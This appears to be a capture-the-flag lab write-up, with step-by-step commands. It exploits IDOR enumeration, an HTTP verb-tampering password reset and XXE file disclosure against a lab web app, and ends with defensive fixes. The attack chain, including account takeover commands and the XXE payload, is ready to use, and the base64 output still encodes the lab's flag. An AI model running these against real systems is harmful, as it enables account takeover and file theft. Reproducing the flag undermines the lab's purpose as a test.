# 🛰️ Initial Access & Reconnaissance

## Phase 1: Reconnaissance & Enumeration

### Step 1: Nmap Scan for Open Ports & Services

```bash
nmap -sC -sV --min-rate=500 htb-student.htb
```

### Step 2: Identify Target Service (HTTP)

**Service Identification:** Port `80/tcp` with HTTP service.

## Phase 2: IDOR Discovery and Exploitation

### Step 3: Discover API Endpoints & User Data Access

#### Analyze Traffic:
- **Target:** `/api.php/user/ID`
- **Method:** GET
- **Example Request:** 
```bash
curl "http://target.com/api.php/user/1"
```

**Response Sample:**
```json
{
  "id": 1,
  "username": "user",
  "email": "example@example.com",
  "role": "student"
}
```

### Step 4: Enumerate User IDs

```bash
for i in {1..100}; do curl -s http://target.com/api.php/user/$i; done | grep '"username"'
```

**User Enumeration Results:** `a.corrales` (UID:52)

### Step 5: Extract Token for Admin Account

#### Analyze Traffic:
- **Target:** `/api.php/token/ID`
- **Method:** POST
- **Example Request:**
```bash
curl -X POST "http://target.com/api.php/token/1"
```

**Response Sample (Token Extraction):**
```json
{
  "token": "e51a85fa-17ac-11ec-8e51-e78234eb7b0c"
}
```

## Phase 3: Authorization Bypass

### Step 6: Reset Password & Authenticated Request Fails

#### Direct Password Reset Attempt:
```bash
curl -X POST "http://target.com/reset.php" \
    -H "Cookie: PHPSESSID=[SESSION]" \
    -d "uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=newpass123"
```

**Response:** `Access Denied`
- **Backend Checks PHPSESSID against UID**

### Step 7: Bypass HTTP Verb Tampering

#### Generate Strong Password:
```bash
openssl rand -hex 16
# Output: f0e18de14fdadfc38350d97ff7284a25
```

**Bypass with GET Method:**
```bash
curl "http://target.com/reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=f0e18de14fdadfc38350d97ff7284a25" \
    -H "Cookie: PHPSESSID=[SESSION]"
```

**Response:** `Password Updated Successfully`
- **✅ Success: Authorization bypass via HTTP verb tampering**

---

# 🔍 Admin Access & XXE Discovery

### Phase 4: Gaining Administrative Privileges

#### Step 8: Login as Administrator

```text
Username: a.corrales
Password: f0e18de14fdadfc38350d97ff7284a25
```

**New Features Unlocked:**
- ✅ Administrative dashboard access
- ✅ **"ADD EVENT"** functionality (previously hidden)

### Phase 5: Discovering XXE Injection Point

#### Step 9: Event Creation Analysis

1. Navigate to **ADD EVENT** functionality.
2. Fill form with dummy data.
3. Intercept request in Burp Suite/Network tab.

**XXE Injection Point Found:**

```http
POST /addEvent.php HTTP/1.1
Host: target.com
Content-Type: application/xml
Cookie: PHPSESSID=admin_session...

<root>
    <name>Test Event</name>
    <details>Test Description</details>
    <date>2021-09-22</date>
</root>
```

**🎯 XML Input Identified:** Application accepts XML data for event creation.

---

# 🛠️ XXE File Disclosure & Flag Extraction

### Phase 6: Crafting and Executing the XXE Attack

#### Step 10: Craft XXE Payload for Flag Extraction

**XXE Payload Construction:**

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php"> ]>
<root>
    <name>&xxe;</name>
    <details>XXE Test</details>
    <date>2021-09-22</date>
</root>
```

**Payload Breakdown:**
- `<!DOCTYPE replace [...]>` - External entity definition.
- `php://filter/convert.base64-encode/resource=/flag.php` - PHP filter to avoid XML parsing issues.
- `&xxe;` - Entity reference in name field (displayed in response).

#### Step 11: Execute XXE Attack

**Manual Exploitation:**

```bash
curl -X POST "http://target.com/addEvent.php" \
    -H "Content-Type: application/xml" \
    -H "Cookie: PHPSESSID=[ADMIN_SESSION]" \
    -d '<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php"> ]>
<root>
    <name>&xxe;</name>
    <details>XXE Test</details>
    <date>2021-09-22</date>
</root>'
```

**Response Contains Base64:**
```text
PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K
```

#### Step 12: Decode Flag

**Base64 Decoding:**

```bash
echo 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' | base64 -d

# Output:
<?php $flag = "HTB{...}"; ?>
```

**🏆 Final Flag:** `HTB{...}`

---

## Attack Chain Summary

```mermaid
graph TD
    A[Initial Access<br/>htb-student] --> B[IDOR Discovery<br/>/api.php/user/ID]
    B --> C[User Enumeration<br/>UIDs 1-100]
    C --> D[Admin User Found<br/>a.corrales UID:52]
    D --> E[Token Extraction<br/>/api.php/token/52]
    E --> F[Password Reset Attempt<br/>POST /reset.php]
    F --> G[Authorization Bypass<br/>GET Method]
    G --> H[Admin Access<br/>a.corrales login]
    H --> I[XXE Discovery<br/>/addEvent.php XML]
    I --> J[Flag Extraction<br/>php://filter XXE]
    J --> K[Mission Complete<br/>HTB{...}]
```

---

## Key Learning Points

### 1. 🛠️ IDOR Exploitation Techniques
- ✅ Sequential ID enumeration (1-100)
- ✅ API endpoint discovery through traffic analysis
- ✅ Multi-step IDOR (user data → tokens)
- ✅ Privilege escalation via user enumeration

### 2. 🛠️ HTTP Verb Tampering Applications
- ✅ Authorization bypass (POST → GET conversion)
- ✅ Session-based security control evasion
- ✅ Parameter injection through URL manipulation

### 3. 🛠️ XXE Injection for File Disclosure  
- ✅ PHP filter usage for binary/special character handling
- ✅ Entity reference in XML elements
- ✅ Base64 encoding/decoding for file extraction

### 4. 🚀 Attack Chaining Methodology
- ✅ **Reconnaissance** → Traffic analysis and endpoint discovery
- ✅ **Vulnerability Assessment** → Systematic testing across attack vectors
- ✅ **Exploitation** → Combining multiple vulnerabilities for privilege escalation
- ✅ **Post-Exploitation** → Administrative access and sensitive data extraction

---

## Defensive Recommendations

### IDOR Prevention
```php
// Secure implementation with authorization checks
if ($_SESSION['user_id'] != $requested_uid && !is_admin($_SESSION['user_id'])) {
    http_response_code(403);
    die("Access Denied");
}
```

### HTTP Method Restrictions
```apache
# .htaccess - Restrict reset.php to POST only
<Files "reset.php">
    <RequireAll>
        Require method POST
    </RequireAll>
</Files>
```

### XXE Prevention
```php
// Disable external entity loading
libxml_disable_entity_loader(true);

// Or use secure XML parsing
$dom = new DOMDocument();
$dom->resolveExternals = false;
$dom->substituteEntities = false;
```

---

## Tools & Resources

### Automation Scripts
- **User Enumeration:** Custom bash script for IDOR testing.
- **Burp Suite:** Request modification and response analysis.
- **curl:** Command-line tool for making HTTP requests.

### Additional Tools
- **Nmap**: For initial network reconnaissance and service identification.  
- **Wireshark**: For packet capture and analyzing traffic in detail.  

---

# 🏁 Mission Complete

Congratulations on successfully completing the mission! You have gained administrative access by exploiting IDOR vulnerabilities, bypassed HTTP method restrictions, and extracted sensitive information via XXE attacks. Stay vigilant and keep learning to secure systems against such threats. Happy hacking!